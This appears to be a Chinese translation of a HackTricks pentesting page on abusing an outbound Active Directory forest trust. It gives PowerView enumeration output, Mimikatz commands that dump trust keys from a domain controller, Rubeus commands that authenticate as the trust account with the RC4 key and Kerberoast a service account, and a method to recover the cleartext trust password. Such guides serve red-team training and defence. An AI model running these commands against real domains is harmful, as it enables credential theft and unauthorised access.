# 外部森林域 - 单向（出站）

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* 你在一个**网络安全公司**工作吗？你想在HackTricks中看到你的**公司广告**吗？或者你想要**获取PEASS的最新版本或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品——[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)，或者**关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **通过向**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享你的黑客技巧。**

</details>

在这种情况下，**你的域**信任来自**不同域**的某些**特权**。

## 枚举

### 出站信任
```powershell
# Notice Outbound trust
Get-DomainTrust
SourceName      : root.local
TargetName      : ext.local
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM

# Lets find the current domain group giving permissions to the external domain
Get-DomainForeignGroupMember
GroupDomain             : root.local
GroupName               : External Users
GroupDistinguishedName  : CN=External Users,CN=Users,DC=DOMAIN,DC=LOCAL
MemberDomain            : root.io
MemberName              : S-1-5-21-1028541967-2937615241-1935644758-1115
MemberDistinguishedName : CN=S-1-5-21-1028541967-2937615241-1935644758-1115,CN=ForeignSecurityPrincipals,DC=DOMAIN,DC=LOCAL
## Note how the members aren't from the current domain (ConvertFrom-SID won't work)
```
## 信任账户攻击

当从域_B_到域_A_（_**B**_信任A）建立Active Directory域或森林信任时，在域**A**中创建了一个名为**B. Kerberos trust keys**的信任账户，该账户的密码派生出来的**信任账户的密码**用于**加密跨域TGTs**，当域A的用户请求域B中的服务票证时。

可以通过以下方式从域控制器获取信任账户的密码和哈希值：
```powershell
Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
```
风险是因为启用了信任账户B$，**B$的主要组是域A的域用户**，对域用户授予的任何权限都适用于B$，可以使用B$的凭据对域A进行身份验证。

{% hint style="warning" %}
因此，**从信任域中可以获取到受信任域内的用户**。这个用户可能没有很多权限（可能只有域用户权限），但你将能够**枚举外部域**。
{% endhint %}

在这个例子中，信任域是`ext.local`，受信任域是`root.local`。因此，在`root.local`中创建了一个名为`EXT$`的用户。
```bash
# Use mimikatz to dump trusted keys
lsadump::trust /patch
# You can see in the output the old and current credentials
# You will find clear text, AES and RC4 hashes
```
因此，此时我们拥有 **`root.local\EXT$`** 的当前 **明文密码和Kerberos秘密密钥**。`root.local\EXT$` 的Kerberos AES秘密密钥与AES信任密钥相同，只是使用了不同的盐，但 **RC4密钥是相同的**。因此，我们可以使用从ext.local转储的RC4信任密钥来对 `root.local` 进行身份验证，作为 `root.local\EXT$`。
```bash
.\Rubeus.exe asktgt /user:EXT$ /domain:root.local /rc4:<RC4> /dc:dc.root.local /ptt
```
通过这个方法，你可以开始枚举该域，并且甚至可以对用户进行Kerberoasting攻击：
```
.\Rubeus.exe kerberoast /user:svc_sql /domain:root.local /dc:dc.root.local
```
### 收集明文信任密码

在之前的流程中，使用了信任哈希而不是**明文密码**（也被**mimikatz转储**）。

可以通过将mimikatz的\[ CLEAR ]输出从十六进制转换并删除空字节‘\x00’来获取明文密码：

![](<../../.gitbook/assets/image (2) (1) (2) (1).png>)

有时在创建信任关系时，用户必须输入信任密码。在这个演示中，关键是原始的信任密码，因此是可读的。随着密钥的循环（30天），明文将不再是可读的，但从技术上仍然可用。

明文密码可以用于以信任账户的身份执行常规身份验证，这是一种使用信任账户的Kerberos密钥请求TGT的替代方法。在这里，从ext.local查询root.local的Domain Admins成员：

![](<../../.gitbook/assets/image (1) (1) (1) (2).png>)

## 参考资料

* [https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-7-trust-account-attack-from-trusting-to-trusted](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-7-trust-account-attack-from-trusting-to-trusted)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* 你在一家**网络安全公司**工作吗？想要在HackTricks中**为你的公司做广告**吗？或者你想要**获取PEASS的最新版本或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[NFTs](https://opensea.io/collection/the-peass-family)收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram群组**](https://t.me/peass) 或 **关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **通过向**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享你的黑客技巧。**

</details>
